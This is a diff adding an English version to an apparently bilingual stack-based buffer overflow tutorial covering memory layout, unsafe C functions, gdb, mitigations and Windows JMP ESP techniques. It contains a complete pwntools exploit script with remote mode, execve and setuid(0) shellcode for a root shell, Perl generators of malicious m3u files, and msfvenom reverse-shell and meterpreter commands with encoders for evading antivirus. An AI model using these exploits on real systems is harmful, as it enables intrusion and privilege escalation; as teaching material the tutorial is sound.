@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Buffer Overflow — 스택 기반 오버플로우 완전 정복
 
 ## 1. 메모리 구조 기초
@@ -1314,5 +1320,1326 @@ ln -s test test1
 xxd 파일명
 
 # 라이브러리 함수 목록 보기
+/usr/bin/nm /lib/libc.so.6 | more
+```
+
+
+---
+
+<a name="english"></a>
+
+# Buffer Overflow — Complete Guide to Stack-Based Overflow
+
+## 1. Memory Structure Basics
+
+### Process Memory Layout
+
+Process memory is divided into code, data, heap, and stack regions. A buffer overflow attack works by exceeding the allocated buffer size in the stack region to overwrite the Return Address.
+
+```
+High Address
+┌─────────────────────────┐
+│      Stack              │ ← Local variables, function args, return address
+│       ↓ (grows down)    │
+│─────────────────────────│
+│                         │
+│─────────────────────────│
+│       ↑ (grows up)      │
+│      Heap               │ ← malloc, calloc, new
+│─────────────────────────│
+│      BSS                │ ← Uninitialized global/static variables
+│─────────────────────────│
+│      Data               │ ← Initialized global/static variables
+│─────────────────────────│
+│      Text (Code)        │ ← Executable code, constants
+└─────────────────────────┘
+Low Address
+```
+
+### Stack Structure
+
+The stack grows from high to low addresses, with ESP pointing to the current top of the stack. Since return addresses and local variables are stored here during function calls, overwriting the return address via buffer overflow redirects execution flow.
+
+```
+IA-32 (32-bit) Stack:
+- Grows from high address to low address
+- PUSH: decrements ESP then stores value
+- POP:  reads value then increments ESP
+- ESP: Stack Pointer (points to top of stack)
+- EBP: Base Pointer (stack frame base)
+
+Stack Frame Structure:
+┌──────────────────┐  High Address
+│  Caller Arguments │
+│──────────────────│
+│  Return Address  │ ← Key target to overwrite via BoF
+│──────────────────│
+│  Saved EBP       │ ← Previous EBP value
+│──────────────────│
+│  Local Variable1 │ ← EBP - 4
+│  Local Variable2 │ ← EBP - 8
+│  buffer[128]     │ ← Overflow via gets(), strcpy(), etc.
+└──────────────────┘  Low Address (← ESP)
+```
+
+---
+
+## 2. Buffer Overflow Principle
+
+### Vulnerable Code Example
+
+Functions like `strcpy()` and `gets()` that copy user input into a buffer without size checking are the primary cause of buffer overflows. The code below accepts arbitrary-length input into a 64-byte buffer, which can corrupt the stack.
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];        // 64-byte buffer
+    strcpy(buffer, input);  // No size check! → vulnerable
+    printf("Input: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    vulnerable_function(argv[1]);
+    return 0;
+}
+```
+
+### Stack State Changes
+```
+Normal execution:
+┌────────────────┐
+│  argv[1]       │  "hello" (5 bytes)
+│  ...           │
+│ Return Address │  0x08048400
+│ Saved EBP      │  0xbfff1000
+│ buffer[64]     │  "hello\0..."
+└────────────────┘
+
+During attack (input ≥ 64 + 4 + 4 + 4 = 72 bytes):
+┌────────────────┐
+│ Return Address │  0x41414141 (AAAA) ← Control hijacked!
+│ Saved EBP      │  0x41414141 (AAAA)
+│ buffer[64]     │  AAAA...AAAA (64 bytes)
+└────────────────┘
+```
+
+---
+
+## 3. gets() Function Vulnerability
+
+### gets() vs fgets() Comparison
+
+The `gets()` function does not limit input length, making it vulnerable to buffer overflow. It must be replaced with `fgets()` or functions that validate input length.
+
+```c
+// Dangerous: gets() has no input length limit
+char buf[64];
+gets(buf);          // Vulnerable! any amount of input accepted
+
+// Safe: fgets() limits input size
+char buf[64];
+fgets(buf, sizeof(buf), stdin);  // Safe
+```
+
+### List of Vulnerable Functions
+| Function | Risk | Safe Alternative |
+|----------|------|-----------------|
+| gets() | Unlimited size | fgets() |
+| strcpy() | No size check | strncpy(), strlcpy() |
+| strcat() | No size check | strncat(), strlcat() |
+| sprintf() | Unlimited output | snprintf() |
+| scanf("%s") | No size limit | scanf("%63s") |
+
+---
+
+## 4. Understanding Endianness — Key Concept
+
+### Big Endian vs Little Endian
+```
+Storing value 0x12345678 in memory:
+
+Big Endian (Network byte order):
+Address: 0x100  0x101  0x102  0x103
+Value:   0x12   0x34   0x56   0x78   ← High byte at low address
+
+Little Endian (x86/x64 Intel):
+Address: 0x100  0x101  0x102  0x103
+Value:   0x78   0x56   0x34   0x12   ← Low byte at low address
+```
+
+### Endianness in Exploits
+```python
+# Packing address in x86 little endian
+import struct
+
+address = 0xbfff1234
+# In memory: \x34\x12\xff\xbf
+packed = struct.pack('<I', address)
+print(repr(packed))  # b'\x34\x12\xff\xbf'
+
+# In exploit code
+payload  = b"A" * 64         # Fill buffer
+payload += b"B" * 4          # Overwrite Saved EBP
+payload += struct.pack('<I', 0xbfff1234)  # Overwrite Return Address
+```
+
+---
+
+## 5. Memory Hexdump Analysis
+
+### Inspecting Memory with gdb
+
+GDB (GNU Debugger) is the key tool for analyzing and verifying buffer overflows on Linux. Using PEDA or pwndbg plugins visualizes registers, stack, and heap state in color for easier analysis.
+
+```bash
+# Compile (disable protections)
+gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
+
+# Run GDB
+gdb ./vuln
+(gdb) disas main
+(gdb) disas vulnerable_function
+
+# Set breakpoint and run
+(gdb) break *vulnerable_function+XX
+(gdb) run $(python3 -c "print('A'*80)")
+
+# Check registers
+(gdb) info registers
+(gdb) x/16x $esp      # Print 16 hex values from ESP
+(gdb) x/s $eax        # Print EAX as string
+(gdb) x/10i $eip      # Print 10 instructions from EIP
+```
+
+### Reading Hexdumps
+```
+Memory dump example:
+0xbfff1000: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
+0xbfff1010: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
+...
+0xbfff1040: 42 42 42 42  78 56 34 12                              BBBB.x4.
+
+Analysis:
+0xbfff1000 ~ 0xbfff103F: 64 'A' bytes (buffer region)
+0xbfff1040 ~ 0xbfff1043: 4 'B' bytes (Saved EBP overwritten)
+0xbfff1044 ~ 0xbfff1047: \x78\x56\x34\x12 = 0x12345678 (Return Address)
+```
+
+---
+
+## 6. Practical Buffer Overflow Attack
+
+### Step-by-Step Attack Procedure
+```
+Step 1: Confirm vulnerability (Fuzzing)
+   → Trigger crash with large input
+
+Step 2: Calculate offset (distance to EIP)
+   → Find exact offset with cyclic pattern
+
+Step 3: Find Return Address
+   → Shellcode location or useful gadget address
+
+Step 4: Write exploit
+   → payload = padding + new_return_address + shellcode
+
+Step 5: Execute attack and obtain shell
+```
+
+### Calculating Offset with Cyclic Pattern
+
+Use pwntools' cyclic pattern to precisely calculate the offset to EIP. After crashing with the pattern, use the EIP value to determine the exact overwrite offset.
+
+```python
+from pwn import *
+
+# Generate cyclic pattern (200 bytes)
+pattern = cyclic(200)
+print(pattern)
+# aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...
+
+# Calculate offset from value in EIP
+# Example: EIP = 0x61616166 ('faaa')
+offset = cyclic_find(0x61616166)
+print(offset)  # → 20 (20 bytes from buffer to EIP)
+
+# pwntools GDB automation — offset measurement helper
+def measure_offset(binary: str, pattern_size: int = 300, timeout: int = 5) -> int | None:
+    """Auto-measure offset from crash core by running the binary."""
+    context.arch = "i386"
+    elf = ELF(binary, checksec=False)
+    p = process(binary)
+    p.sendline(cyclic(pattern_size))
+    p.wait(timeout=timeout)
+    try:
+        core = p.corefile
+        return cyclic_find(core.eip)
+    except Exception:
+        return None
+```
+
+### Shellcode (Linux x86)
+
+Insert the execve("/bin/sh") shellcode into the exploit payload. This 23-byte null-free shellcode executes /bin/sh.
+
+```python
+# execve("/bin/sh", 0, 0) shellcode (23 bytes)
+shellcode = (
+    b"\x31\xc0"             # xor eax, eax
+    b"\x50"                 # push eax (null terminator)
+    b"\x68\x2f\x2f\x73\x68" # push "//sh"
+    b"\x68\x2f\x62\x69\x6e" # push "/bin"
+    b"\x89\xe3"             # mov ebx, esp
+    b"\x50"                 # push eax
+    b"\x53"                 # push ebx
+    b"\x89\xe1"             # mov ecx, esp
+    b"\x31\xd2"             # xor edx, edx
+    b"\xb0\x0b"             # mov al, 0x0b (execve syscall)
+    b"\xcd\x80"             # int 0x80
+)
+```
+
+### Complete Exploit (NOP Sled + Shellcode)
+
+After controlling EIP, insert the shellcode to execute into the buffer. Shellcode typically runs `/bin/sh` or establishes a reverse shell, and `msfvenom` can generate payloads for various platforms.
+
+```python
+#!/usr/bin/env python3
+"""
+pwntools-based BOF exploit framework — supports local/remote/GDB modes
+Usage:
+  python3 bof_exploit.py              # Local execution
+  python3 bof_exploit.py --remote HOST PORT   # Remote attack
+  python3 bof_exploit.py --gdb        # GDB debugging
+  python3 bof_exploit.py --find-offset  # Auto-detect offset with cyclic pattern
+"""
+import argparse
+import sys
+from pathlib import Path
+
+try:
+    from pwn import (
+        ELF, ROP, cyclic, cyclic_find, flat, log, p32, p64,
+        process, remote, gdb, context, asm, shellcraft,
+    )
+except ImportError:
+    sys.exit("[!] pwntools required: pip3 install pwntools")
+
+
+# ── Target binary configuration ───────────────────────────────────────
+BINARY = "./vuln"          # Target binary path
+ARCH   = "i386"            # i386 or amd64
+OS     = "linux"
+
+context.arch = ARCH
+context.os   = OS
+context.log_level = "info"
+
+
+def find_offset(binary_path: str, pattern_size: int = 300) -> int | None:
+    """Auto-calculate EIP/RIP offset using cyclic pattern."""
+    log.info(f"Detecting offset... (pattern size: {pattern_size})")
+    pattern = cyclic(pattern_size)
+
+    try:
+        elf = ELF(binary_path, checksec=False)
+        p = process(binary_path)
+        p.sendline(pattern)
+        p.wait()
+
+        core = p.corefile
+        if context.arch == "i386":
+            crashed_eip = core.eip
+            offset = cyclic_find(crashed_eip)
+        else:
+            crashed_rsp = core.read(core.rsp, 4)
+            offset = cyclic_find(crashed_rsp)
+
+        log.success(f"Offset found: {offset}")
+        return offset
+    except Exception as e:
+        log.warning(f"Auto-detection failed: {e}  — manual GDB check required")
+        return None
+
+
+def build_payload(elf: ELF, offset: int, use_rop: bool = False) -> bytes:
+    """
+    Build payload:
+    - NX disabled: NOP Sled + Shellcode
+    - NX enabled:  ROP chain
+    """
+    if use_rop or bool(elf.nx):
+        log.info("NX enabled — building ROP chain")
+        rop = ROP(elf)
+
+        # ret2libc pattern: call system("/bin/sh")
+        try:
+            system_addr = elf.plt.get("system") or elf.symbols["system"]
+            binsh_addr  = next(elf.search(b"/bin/sh\x00"))
+            ret_gadget  = rop.find_gadget(["ret"])[0]  # stack alignment
+
+            if context.arch == "amd64":
+                rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
+                chain = flat(
+                    b"A" * offset,
+                    p64(ret_gadget),     # 16-byte stack alignment
+                    p64(rdi_gadget),
+                    p64(binsh_addr),
+                    p64(system_addr),
+                )
+            else:
+                chain = flat(
+                    b"A" * offset,
+                    p32(system_addr),
+                    p32(0xdeadbeef),  # fake return address
+                    p32(binsh_addr),
+                )
+            log.info(f"ROP chain built ({len(chain)} bytes)")
+            return chain
+        except Exception as e:
+            log.warning(f"ROP build failed: {e}  — falling back to NOP Sled")
+
+    # NOP Sled + Shellcode method
+    log.info("Building NOP Sled + Shellcode payload")
+    if context.arch == "amd64":
+        shellcode = asm(shellcraft.amd64.linux.sh())
+        packer = p64
+    else:
+        shellcode = asm(shellcraft.i386.linux.sh())
+        packer = p32
+
+    nop_sled = b"\x90" * 64
+
+    # Return address: expected NOP Sled location in stack (verify with gdb)
+    ret_addr = 0xbfff1090  # Adjust after confirming in gdb during practice
+
+    padding = b"A" * (offset - len(nop_sled) - len(shellcode))
+    payload = nop_sled + shellcode + padding + packer(ret_addr)
+
+    log.info(f"Payload: {len(payload)} bytes  |  RET: {hex(ret_addr)}")
+    return payload
+
+
+def exploit(args: argparse.Namespace) -> None:
+    binary_path = args.binary
+
+    if not Path(binary_path).exists():
+        sys.exit(f"[!] Binary not found: {binary_path}")
+
+    elf = ELF(binary_path, checksec=True)
+    context.binary = elf
+
+    # Offset detection mode
+    if args.find_offset:
+        find_offset(binary_path, args.pattern_size)
+        return
+
+    offset = args.offset
+    if offset is None:
+        offset = find_offset(binary_path)
+        if offset is None:
+            offset = int(input("[?] Enter offset manually: "))
+
+    payload = build_payload(elf, offset, use_rop=args.rop)
+
+    # Select connection mode
+    if args.remote:
+        host, port = args.remote
+        log.info(f"Remote connection: {host}:{port}")
+        io = remote(host, int(port))
+    elif args.gdb_mode:
+        log.info("GDB debug mode")
+        io = gdb.debug(binary_path, gdbscript="""
+            break *vulnerable_function
+            continue
+        """)
+    else:
+        log.info(f"Local execution: {binary_path}")
+        io = process(binary_path)
+
+    try:
+        log.info(f"Sending payload ({len(payload)} bytes)")
+        io.sendlineafter(b":", payload) if args.prompt else io.sendline(payload)
+        io.interactive()
+    except EOFError:
+        log.failure("Connection closed — crash occurred or wrong offset")
+    finally:
+        io.close()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="pwntools BOF exploit framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("-b", "--binary", default=BINARY, help="Target binary")
+    parser.add_argument("-o", "--offset", type=int, help="EIP/RIP offset (auto-detected if not specified)")
+    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="Remote attack mode")
+    parser.add_argument("--gdb", dest="gdb_mode", action="store_true", help="GDB debugging mode")
+    parser.add_argument("--find-offset", action="store_true", help="Only detect offset with cyclic")
+    parser.add_argument("--pattern-size", type=int, default=300, help="Cyclic pattern size")
+    parser.add_argument("--rop", action="store_true", help="Force ROP chain usage")
+    parser.add_argument("--prompt", action="store_true", help="Wait for input prompt then send")
+    args = parser.parse_args()
+    exploit(args)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 7. Privilege Escalation via setUID Bit
+
+### setUID Concept
+
+Files with the setUID bit set run with the file owner's permissions. If a root-owned setUID program is vulnerable, it can be exploited for privilege escalation.
+
+```bash
+# setUID: execute with owner (usually root) permissions
+ls -la /usr/bin/passwd
+# -rwsr-xr-x 1 root root ... /usr/bin/passwd
+#    ^-- s: setUID bit (runs as root)
+
+# Find vulnerable setUID programs for root shell!
+find / -perm -4000 -type f 2>/dev/null
+```
+
+### Attacking a Vulnerable setUID Program
+
+Example of a setUID program with a buffer overflow vulnerability. Exploiting this program yields a root shell.
+
+```c
+// Vulnerable setUID program (./vuln_suid)
+// Owner: root, setUID set
+#include <stdio.h>
+#include <string.h>
+
+void copy(char *src) {
+    char buf[32];
+    strcpy(buf, src);  // Vulnerable!
+}
+
+int main(int argc, char **argv) {
+    copy(argv[1]);
+    return 0;
+}
+```
+
+```python
+# Exploit setUID program to get root shell
+import struct
+
+# Shellcode to get root shell (setuid(0) + execve /bin/sh)
+shellcode = (
+    b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  # setuid(0)
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+    b"\x53\x89\xe1\xb0\x0b\xcd\x80"       # execve(/bin/sh)
+)
+
+offset = 44  # buffer(32) + saved_ebp(4) + 8 (alignment)
+ret_addr = struct.pack('<I', 0xbfff1234)
+
+payload = b"\x90" * 16 + shellcode
+payload += b"A" * (offset - len(payload))
+payload += ret_addr
+
+print(repr(payload))
+```
+
+---
+
+## 8. Exploit Mitigations
+
+### ASLR (Address Space Layout Randomization)
+
+Check the ASLR status. When ASLR is enabled, the addresses of stack, heap, and libraries change with every execution, making exploitation harder.
+
+```bash
+# Check ASLR status
+cat /proc/sys/kernel/randomize_va_space
+# 0 = disabled
+# 1 = partial
+# 2 = full
+
+# Disable ASLR (for practice)
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+# ASLR bypass techniques:
+# - Brute Force (32-bit address space is small)
+# - Information Leak (exploit address leak vulnerability)
+# - NOP Sled (increase hit probability)
+```
+
+### Stack Canary
+
+Stack Canary is a protection mechanism that detects buffer overflows. If the canary value is modified before function return, it triggers a stack smashing error.
+
+```bash
+# Enabled by default in GCC
+gcc -fstack-protector-all vuln.c -o vuln  # Enable
+gcc -fno-stack-protector vuln.c -o vuln   # Disable (for practice)
+
+# Behavior: inserts canary value at end of stack frame
+# Verifies canary before function return; terminates program if modified
+```
+
+### DEP/NX (Data Execution Prevention / No-Execute)
+
+DEP/NX prevents code execution from stack and heap memory. Bypassing this protection requires ROP (Return Oriented Programming).
+
+```bash
+# Non-executable stack (default)
+gcc -z noexecstack vuln.c  # Enable NX
+gcc -z execstack vuln.c    # Disable NX (for practice)
+
+# NX bypass: ROP (Return Oriented Programming)
+# → Reuse existing code fragments (gadgets) with execution permissions
+```
+
+### PIE (Position Independent Executable)
+
+PIE combined with ASLR loads the binary itself at a random address. When PIE is enabled, the code base address must be leaked first.
+
+```bash
+# ASLR + PIE: binary itself loads at random address
+gcc -pie -fPIE vuln.c  # Enable PIE
+gcc -no-pie vuln.c     # Disable PIE
+
+# Check
+checksec --file=vuln   # tool included with pwntools
+```
+
+---
+
+## 9. Windows Stack-Based BOF — Step-by-Step Attack
+
+### 9-1. Trigger Crash (Fuzzing)
+
+The first step in attacking a Windows application BOF is triggering a crash with large input.
+
+```perl
+# Generate malicious m3u file with Perl (Easy RM to MP3 example)
+my $file = "crash.m3u";
+my $junk = "\x41" x 30000;   # 30000 'A' characters
+open($FILE, ">$file");
+print $FILE "$junk";
+close($FILE);
+print "m3u File Created Successfully\n";
+```
+
+When EIP shows `41414141` ('AAAA') in WinDbg after crash, EIP control is possible.
+
+### 9-2. Calculate EIP Offset (Metasploit Pattern)
+
+Metasploit Framework is a vulnerability exploitation automation platform. Find the module with `search`, select with `use`, then specify target and payload with `set RHOSTS` and `set PAYLOAD` to execute the attack.
+
+```bash
+# Generate unique pattern with Metasploit pattern_create
+./pattern_create.rb 5000
+
+# Trigger crash with pattern, then check EIP value in WinDbg
+# If EIP = 6A42376A, calculate with pattern_offset
+./pattern_offset.rb 0x6a42376a 5000
+# → 1072  (offset to EIP)
+```
+
+```python
+# Same with pwntools
+from pwn import *
+pattern = cyclic(5000)
+offset = cyclic_find(0x6a42376a)
+print(offset)  # 1072
+```
+
+### 9-3. Confirm EIP Control
+
+After finding the crash point with fuzzer, calculate the exact offset with MSF pattern. Generate a unique pattern with `msf-pattern_create`, send it, then analyze the EIP value with `msf-pattern_offset` to find the exact byte offset to EIP.
+
+```perl
+# Offset verification script
+my $file = "eip_control.m3u";
+my $junk = "\x41" x 26072;    # Padding before offset
+my $eip  = "BBBB";             # EIP slot (verify with 42424242)
+my $rest = "C" x 1000;         # Data after ESP
+open($FILE, ">$file");
+print $FILE $junk.$eip.$rest;
+close($FILE);
+```
+
+Control confirmed when EIP = `42424242` and 'C' values appear in ESP in WinDbg.
+
+### 9-4. Find JMP ESP Address
+
+Jumping directly to memory addresses (like `0x000ff730`) fails due to null byte issues. Instead, use a DLL address containing the `JMP ESP` instruction.
+
+```bash
+# JMP ESP opcode: \xff\xe4
+# Search within DLL range in WinDbg
+s 01980000 l 019f1000 ff e4
+
+# Search with findjmp tool
+findjmp MSRMCcodec02.dll esp
+# → 0x01BBF23A  jmp esp  (select address without null bytes)
+```
+
+Overwrite EIP with JMP ESP address to redirect execution flow to shellcode on the stack. Choose an address without null bytes.
+
+```perl
+# Overwrite EIP with JMP ESP address
+my $eip = pack('V', 0x01bbf23a);  # little-endian packing
+```
+
+### 9-5. NOP Sled + Shellcode Insertion
+
+NOP Sled is an array of NOP (0x90) instructions placed before shellcode. Even if the address is not exact, execution slides through NOPs to reach the shellcode, increasing reliability.
+
+```perl
+# Final exploit structure
+my $file = "exploit.m3u";
+my $junk      = "\x41" x 26072;
+my $eip       = pack('V', 0x01bbf23a);  # JMP ESP address
+my $nop_sled  = "\x90" x 25;            # NOP sled
+my $shellcode = (                        # Shellcode generated with msfvenom
+    "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
+    "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
+    # ... (actual shellcode)
+    "\x7f\xe8\x7b\xca"
+);
+open($FILE, ">$file");
+print $FILE $junk.$eip.$nop_sled.$shellcode;
+close($FILE);
+```
+
+### 9-6. Generate Shellcode with msfvenom
+
+Generate shellcode for Windows with msfvenom. Use encoder options to remove null bytes and bypass AV detection.
+
+```bash
+# Windows x86 calculator shellcode
+msfvenom -p windows/exec CMD=calc.exe -f perl
+
+# Windows x86 reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+  -b "\x00\x0a\x0d" -f perl
+
+# With encoder (bypass bad chars)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 -f c
+```
+
+---
+
+## 10. Various Methods to Jump to Shellcode
+
+Depending on register state at crash time, different jump techniques can be used.
+
+### 10-1. CALL [register]
+
+Used when ESP points directly to shellcode.
+
+```bash
+# Search for CALL ESP in kernel32.dll
+findjmp kernel32.dll esp
+# 0x7C8369F0  call esp
+# 0x7C86467B  jmp esp
+```
+
+Overwrite EIP with JMP ESP address to redirect execution to shellcode on the stack. Choose addresses without null bytes.
+
+```perl
+my $eip = pack('V', 0x7c8369f0);  # CALL ESP address
+my $extra = "XXXX";                # 4 extra bytes so ESP points to shellcode start
+```
+
+### 10-2. POP/RET — When shellcode is at ESP+offset
+
+```
+POP opcodes:
+  pop eax → 0x58
+  pop ebx → 0x5b
+  pop ecx → 0x59
+  pop edx → 0x5a
+  pop esi → 0x5e
+  pop ebp → 0x5d
+  ret     → 0xc3
+
+pop/pop/ret opcodes: 58 5d c3 (or other register combinations)
+```
+
+POP/POP/RET is used in SEH (Structured Exception Handler)-based exploits. Two POPs load the exception handler pointer, then RET jumps to it.
+
+```perl
+# Overwrite EIP with pop/pop/ret address
+# Place JMP ESP address at ESP+8, followed by shellcode
+my $eip   = pack('V', 0x01966a10);  # pop/pop/ret address
+my $jmpesp = pack('V', 0x01bbf23a); # JMP ESP address (at ESP+8 position)
+
+# Payload structure:
+# [AAAA...] [pop/pop/ret addr] [XXXX] [NOP x8] [JMP ESP addr] [NOP] [Shellcode]
+```
+
+### 10-3. PUSH ESP + RET
+
+The 'push esp; ret' gadget saves the ESP value on the stack then jumps to that address. Used when shellcode is located below ESP.
+
+```bash
+# 'push esp; ret' opcodes: 54 c3
+# Search in DLL
+findjmp MSRMCcodec00.dll esp
+# → 0x019557F6  push esp / ret
+```
+
+Final exploit with EIP overwritten to 'push esp; ret' gadget address. Apply after precisely locating shellcode position.
+
+```perl
+my $eip = pack('V', 0x019557f6);  # push esp / ret address
+```
+
+### 10-4. JMP [ESP+offset]
+
+JMP [ESP+offset] is a gadget that jumps to the address at ESP plus a constant offset. Used when shellcode is a fixed distance from ESP.
+
+```bash
+# JMP [ESP+8] opcodes: ff 64 24 08
+# Check in WinDbg:
+# a  (assemble mode)
+# jmp [esp+8]
+# u (unassemble to check opcodes)
+```
+
+### 10-5. Small Buffer Bypass — Insert Shellcode in Front Buffer
+
+When there is insufficient ESP space after EIP, place shellcode in the large padding space before EIP and use jump code to reach it.
+
+```perl
+# Jump code to buffer at ESP+515 (ADD ESP repeatedly + JMP ESP)
+my $jump_code =
+    "\x83\xc4\x67" .  # add esp, 0x67
+    "\x83\xc4\x67" .  # add esp, 0x67
+    "\x83\xc4\x67" .  # add esp, 0x67
+    "\x83\xc4\x67" .  # add esp, 0x67
+    "\x83\xc4\x67" .  # add esp, 0x67
+    "\xff\xe4";        # jmp esp
+
+# Structure: [NOP+Shellcode+A...] [JMP_ESP_addr] [XXXX] [jump_code]
+#                ↑ large buffer before EIP   ↑EIP      ↑ESP  ↑jump code
+```
+
+---
+
+## 11. BOF Fundamentals — From Theory to Practice
+
+### 11-1. Starting Point of Program Attacks
+
+Key characteristics of programs targeted by buffer overflow attacks:
+
+1. The program accepts input from users.
+2. Program execution results vary based on input content.
+3. Abnormally long strings cause abnormal program behavior.
+4. `Segmentation fault` error = the program confessing its own error.
+
+```c
+// Vulnerable program example (PDF 01's test.c)
+main()
+{
+    char name[20];
+    printf("Please enter your name: ");
+    gets(name);                          // Vulnerability point
+    printf("Ah, your name is %s.\n", name);
+}
+// Run: Enter 100+ 'A' characters → Segmentation fault
+```
+
+### 11-2. Buffer Concept
+
+**Buffer** = temporary memory storage for data moving from one place to another.
+
+- Exists everywhere: CPU internals, hard disk, printer, network, programs
+- In C language, **variables** are used as buffers
+
+**Buffer Overflow** = when user input data exceeds buffer capacity and overflows. Invades adjacent memory regions causing program issues.
+
+### 11-3. Using Buffers in C Language
+
+**Variable Types and Sizes (32-bit basis)**:
+
+| Type | Size | Min Value | Max Value |
+|------|------|-----------|-----------|
+| char | 1 byte | -128 | 127 |
+| short int | 2 bytes | -32768 | 32767 |
+| int | 4 bytes | -2147483648 | 2147483647 |
+| long int | 4 bytes | -2147483648 | 2147483647 |
+| unsigned char | 1 byte | 0 | 255 |
+| unsigned short int | 2 bytes | 0 | 65535 |
+| unsigned int | 4 bytes | 0 | 4294967295 (= 2^32-1) |
+
+Array buffer declaration and usage in C. Buffer overflow vulnerabilities occur when input size is not validated.
+
+```c
+// Array variable buffer declaration (ex3.c ~ ex5.c)
+char c[13] = {'H', 'a', 'c', 'k', 'e', 'r', 's', 'c', 'h', 'o', 'o', 'l', '\0'};
+// Or more simply:
+char c[13] = "Hackerschool";
+// Or auto-calculate size:
+char c[] = "Hackerschool";   // Same as char c[13]
+
+// Check variable size with sizeof
+int i = 77;
+printf("size of i: %d\n", sizeof(i));  // → 4
+
+// Check memory address with &(ampersand)
+printf("memory address of i: 0x%x\n", &i);  // → 0xbfffe784 (varies by environment)
+```
+
+**Buffer size calculation**: `char name[20]` → 1 byte × 20 = **20-byte buffer**. Overflow occurs when input exceeds 20 bytes.
+
+### 11-4. Understanding Variable Memory Addresses
+
+A single variable has three pieces of information ("triple"):
+1. **Memory address** (actual location of the variable)
+2. **Allocated size** (in bytes)
+3. **Stored value**
+
+**Relationship between variable declaration order and memory address (on stack)**:
+
+```
+// Code (ex1.c)
+int a = 1;   // Address: 0xbffffb44
+int b = 2;   // Address: 0xbffffb40
+int c = 3;   // Address: 0xbffffb3c
+int d = 4;   // Address: 0xbffffb38
+
+Memory layout (low address → high address):
+d(4)  c(3)  b(2)  a(1)
+0x38  0x3c  0x40  0x44
+```
+
+**Key rule**: Later-declared variables are assigned lower memory addresses.
+
+**Mixed integer + array**:
+```
+// char b[20] = "hello"; int a = 1;
+// b declared later → assigned lower address
+b         a
+0xbffffb30  0xbffffb44
+20 bytes    4 bytes
+```
+
+**Password bypass vulnerability principle** (`real_quiz.c`):
+```c
+int auth = 0;       // Declared first → higher address
+char passwd[20];    // Declared later → lower address (20 bytes just below auth)
+
+gets(passwd);  // Exceeding passwd[20] overwrites auth!
+if(strcmp(passwd, "password") == 0) auth = 1;
+if(auth) printf("Authentication successful!\n");
+```
+→ Entering 21+ bytes into `passwd` corrupts the `auth` value, bypassing authentication without the password.
+
+### 11-5. gets() Function Vulnerability Detail
+
+How `gets()` function works:
+- **Argument**: starting address of buffer to store input (`buffer` is same as `&buffer[0]`)
+- **Termination condition**: until Enter (`\n`) is pressed
+- **No size limit**: stores all values entered before Enter at the specified address
+
+```
+"Stores all values entered by the user before pressing Enter
+ at the memory address given as argument."
+```
+
+Compiler warning message:
+```
+xxx: the `gets' function is dangerous and should not be used.
+```
+
+### 11-6. Function Call and Return Mechanism
+
+**Problem with multiple function calls**: Hardcoding the return address in code causes infinite loops. Therefore, "the address of the next code to execute" is recorded in memory just before calling a function.
+
+```
+This "reference location (address) to use when returning" is called the "Return Address."
+```
+
+**Actual memory layout** (when get_area() is called):
+```
+[low address]
+child function area(0xbfffee54) | ??? | ??? | arg x(0xbfffee60) | arg y(0xbfffee64) | ...parent variables
+                                  ↑SFP  ↑RET
+```
+
+**Memory address rules (on function call)**:
+- Child function locals < SFP < return address < child function arguments < parent function locals
+- Function arguments are allocated from low address in declaration order (opposite of locals)
+
+### 11-7. Return Address Manipulation — Core of the Attack
+
+```
+SFP              Return Address
+[child area] [SFP value] [next code addr] [arg x] [arg y] [parent variables]
+    ↑
+    Buffer overflow here
+    can overwrite the return address!
+```
+
+**Conclusion**: Overwriting the return address via buffer overflow allows jumping to any desired address after function return.
+
+### 11-8. Viewing Memory with Hexdump — dumpcode.h Practice
+
+**Linux hex inspection tools**:
+- `xxd /bin/ls` → outputs binary as hexadecimal (high byte first)
+- `hexdump /bin/ls` → opposite byte order from xxd
+
+**Dumping memory with code**:
+```c
+// Basic hex dump (ex2.c)
+int i;
+char str[20] = "hackerschool!";
+printf("0x%08x ", &str);        // Print address
+for(i=0; i<sizeof(str); i++)
+    printf("%02x ", str[i]);    // Print hex values
+// Result: 0xbffffb30 68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 ...
+```
+
+**Using dumpcode.h** (by ohhara):
+```c
+#include "dumpcode.h"
+
+// Print 100 bytes starting from str variable
+dumpcode((unsigned char *)&str, 100);
+// Result format:
+// 0xbffffb30  68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 00 00   hackerschool!...
+```
+
+Copying `dumpcode()` to `/usr/include/` allows including it from any path.
+
+### 11-9. Little Endian and Big Endian Detail
+
+**Origin**: "Gulliver's Travels" (1726 by Jonathan Swift) egg-cracking debate → first used as computer term in Danny Cohen's paper.
+
+**Big Endian advantages**:
+- Faster comparison of two numbers (no need to compare rest if first byte is larger)
+- Same as human reading order (left → right)
+
+**Little Endian advantages**:
+- Faster even/odd determination (only need first byte)
+- Advantageous for pointer dereferencing (low byte comes first)
+- Faster arithmetic operations
+
+```
